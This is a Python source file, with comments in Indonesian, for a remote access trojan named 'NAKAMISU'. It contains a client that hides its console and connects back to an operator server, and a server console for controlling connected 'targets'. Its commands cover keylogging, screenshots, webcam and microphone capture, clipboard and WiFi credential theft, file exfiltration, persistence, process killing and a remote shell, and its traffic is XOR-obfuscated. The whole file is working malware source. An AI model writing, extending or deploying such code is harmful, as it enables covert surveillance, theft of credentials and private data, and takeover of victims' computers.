import socket
import threading
import json
import time
import struct
import os
import sys
import platform
from datetime import datetime
from modules import ModuleFactory

class RATClient:
    def __init__(self, config, modules_list):
        self.config = config
        self.modules_list = modules_list
        self.server = config.get('server_ip')
        self.port = config.get('server_port')
        self.encryption_key = config.get('encryption_key')
        self.use_encryption = config.get('use_encryption')
        self.sock = None
        self.running = True
        self.module_instances = {}
        self._init_modules()

    def _init_modules(self):
        for mod_name in self.modules_list:
            mod = ModuleFactory.get_module(mod_name, client=self)
            if mod:
                self.module_instances[mod_name] = mod

    def _encrypt(self, data):
        if not self.use_encryption:
            return data if isinstance(data, bytes) else data.encode()
        key = self.encryption_key
        if isinstance(data, str):
            data = data.encode()
        encrypted = bytearray()
        for i, byte in enumerate(data):
            encrypted.append(byte ^ ord(key[i % len(key)]))
        return bytes(encrypted)

    def _decrypt(self, data):
        return self._encrypt(data)  # XOR simetris

    def connect(self):
        while self.running:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.server, self.port))
                # Kirim info awal
                sys_mod = self.module_instances.get("SystemInfo")
                if sys_mod:
                    info = sys_mod.run()
                    self.sock.send(self._encrypt(json.dumps(info)))
                else:
                    self.sock.send(self._encrypt("{}"))
                self._handle_commands()
            except Exception as e:
                if self.config.get('debug_mode'):
                    print(f"Connection error: {e}")
                time.sleep(self.config.get('sleep_delay', 5))
            finally:
                if self.sock:
                    self.sock.close()

    def _handle_commands(self):
        while self.running:
            try:
                data = self.sock.recv(4096)
                if not data:
                    break
                cmd_line = self._decrypt(data).decode().strip()
                if not cmd_line:
                    continue
                parts = cmd_line.split()
                cmd = parts[0].lower()
                response = None

                if cmd == "exit":
                    break
                elif cmd == "ping":
                    response = "pong"
                elif cmd == "info":
                    sys_mod = self.module_instances.get("SystemInfo")
                    response = json.dumps(sys_mod.run(), indent=2) if sys_mod else "No SystemInfo"
                elif cmd == "screenshot" and "Screenshot" in self.module_instances:
                    img = self.module_instances["Screenshot"].run()
                    if isinstance(img, bytes):
                        self.sock.send(struct.pack(">I", len(img)) + img)
                    else:
                        self.sock.send(struct.pack(">I", 0))
                    continue
                elif cmd == "keylog" and "Keylogger" in self.module_instances:
                    if len(parts) > 1:
                        action = parts[1]
                        response = self.module_instances["Keylogger"].run(action)
                    else:
                        response = "Usage: keylog [start|stop|dump]"
                elif cmd == "webcam" and "Webcam" in self.module_instances:
                    img = self.module_instances["Webcam"].run()
                    if isinstance(img, bytes):
                        self.sock.send(struct.pack(">I", len(img)) + img)
                    else:
                        self.sock.send(struct.pack(">I", 0))
                    continue
                elif cmd == "persist" and "Persistence" in self.module_instances:
                    response = self.module_instances["Persistence"].run()
                elif cmd.startswith("download") and "FileManager" in self.module_instances:
                    filename = parts[1] if len(parts) > 1 else ""
                    file_data = self.module_instances["FileManager"].run("download", filename)
                    if isinstance(file_data, bytes):
                        self.sock.send(struct.pack(">I", len(file_data)) + file_data)
                    else:
                        self.sock.send(struct.pack(">I", 0))
                    continue
                elif cmd == "upload" and "FileManager" in self.module_instances:
                    # Belum diimplementasi di sisi server (bisa ditambah)
                    response = "Upload not implemented in this version"
                elif cmd == "ls" and "FileManager" in self.module_instances:
                    path = parts[1] if len(parts) > 1 else "."
                    response = self.module_instances["FileManager"].run("list", path)
                elif cmd == "shell" and "ReverseShell" in self.module_instances:
                    command = " ".join(parts[1:])
                    response = self.module_instances["ReverseShell"].run(command)
                elif cmd == "ps" and "ProcessManager" in self.module_instances:
                    response = self.module_instances["ProcessManager"].run("list")
                elif cmd == "kill" and "ProcessManager" in self.module_instances:
                    pid = parts[1] if len(parts) > 1 else ""
                    response = self.module_instances["ProcessManager"].run("kill", pid)
                elif cmd == "clipboard" and "ClipboardGrabber" in self.module_instances:
                    response = self.module_instances["ClipboardGrabber"].run()
                elif cmd == "audio" and "AudioRecorder" in self.module_instances:
                    dur = parts[1] if len(parts) > 1 else 5
                    try:
                        dur = int(dur)
                    except:
                        dur = 5
                    audio = self.module_instances["AudioRecorder"].run(dur)
                    if isinstance(audio, bytes):
                        self.sock.send(struct.pack(">I", len(audio)) + audio)
                    else:
                        self.sock.send(struct.pack(">I", 0))
                    continue
                elif cmd == "wifi" and "WiFiGrabber" in self.module_instances:
                    response = self.module_instances["WiFiGrabber"].run()
                else:
                    response = f"Unknown command or module inactive: {cmd}"

                if response is not None:
                    self.sock.send(self._encrypt(str(response)[:4096]))
            except Exception as e:
                if self.config.get('debug_mode'):
                    print(f"Command handling error: {e}")
                break
        if self.sock:
            self.sock.close()

    def run(self):
        if self.config.get('hide_console') and platform.system() == "Windows":
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        time.sleep(self.config.get('sleep_delay', 5))
        self.connect()


class RATServer:
    def __init__(self, config):
        self.config = config
        self.server = None
        self.clients = []
        self.running = False

    def start(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.server.bind((self.config.get('server_ip'), self.config.get('server_port')))
            self.server.listen(self.config.get('max_connections'))
            self.running = True
            print(f"[+] Server listening on {self.config.get('server_ip')}:{self.config.get('server_port')}")
            threading.Thread(target=self._accept_connections, daemon=True).start()
            self._command_loop()
        except Exception as e:
            print(f"[-] Server error: {e}")

    def _accept_connections(self):
        while self.running:
            try:
                client, addr = self.server.accept()
                print(f"\n[+] Target connected: {addr[0]}:{addr[1]}")
                try:
                    data = client.recv(4096)
                    if data:
                        print("[i] Received system info")
                except:
                    pass
                self.clients.append({
                    'socket': client,
                    'address': addr,
                    'connected': datetime.now()
                })
            except:
                break

    def _command_loop(self):
        print("\nNAKAMISU Server Console")
        print("Commands: list, use <id>, back, shutdown\n")
        current = None
        while self.running:
            try:
                if current:
                    cmd = input(f"NAKAMISU[{current['address'][0]}]> ").strip()
                else:
                    cmd = input("NAKAMISU> ").strip()
                if not cmd:
                    continue

                if cmd == "list":
                    if not self.clients:
                        print("[-] No targets")
                    else:
                        for i, c in enumerate(self.clients):
                            print(f"[{i}] {c['address'][0]}:{c['address'][1]} - {c['connected'].strftime('%H:%M:%S')}")
                elif cmd.startswith("use "):
                    try:
                        idx = int(cmd[4:])
                        if 0 <= idx < len(self.clients):
                            current = self.clients[idx]
                            print(f"[+] Using target {current['address'][0]}")
                        else:
                            print("[-] Invalid index")
                    except:
                        print("[-] use <index>")
                elif cmd == "back":
                    current = None
                elif cmd == "shutdown":
                    self.running = False
                    for c in self.clients:
                        try:
                            c['socket'].send(b"exit")
                            c['socket'].close()
                        except:
                            pass
                    self.server.close()
                    break
                elif current:
                    self._handle_target_command(current, cmd)
                else:
                    print("[-] Use 'use <id>' first")
            except KeyboardInterrupt:
                print("\n[!] Interrupted")
                break
            except Exception as e:
                print(f"[-] Error: {e}")

    def _handle_target_command(self, target, cmd):
        sock = target['socket']
        # Kirim perintah mentah
        sock.send(self._encrypt(cmd))
        # Terima respon (kecuali untuk perintah yang mengirim binary seperti screenshot)
        if any(cmd.startswith(x) for x in ['screenshot', 'webcam', 'download', 'audio']):
            # Baca panjang data
            raw_len = sock.recv(4)
            if raw_len:
                length = struct.unpack(">I", raw_len)[0]
                if length > 0:
                    data = b""
                    while len(data) < length:
                        chunk = sock.recv(length - len(data))
                        if not chunk:
                            break
                        data += chunk
                    # Simpan file
                    if cmd.startswith('screenshot'):
                        fname = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
                    elif cmd.startswith('webcam'):
                        fname = f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                    elif cmd.startswith('download'):
                        fname = f"downloaded_{cmd.split()[1] if len(cmd.split())>1 else 'file'}"
                    elif cmd.startswith('audio'):
                        fname = f"audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
                    else:
                        fname = "output.bin"
                    with open(fname, 'wb') as f:
                        f.write(data)
                    print(f"[+] File saved: {fname}")
                else:
                    print("[-] No data received")
        else:
            # Respon teks
            data = sock.recv(4096)
            print(self._decrypt(data).decode())

    def _encrypt(self, data):
        if not self.config.get('use_encryption'):
            return data if isinstance(data, bytes) else data.encode()
        key = self.config.get('encryption_key')
        if isinstance(data, str):
            data = data.encode()
        enc = bytearray()
        for i, b in enumerate(data):
            enc.append(b ^ ord(key[i % len(key)]))
        return bytes(enc)

    def _decrypt(self, data):
        return self._encrypt(data)
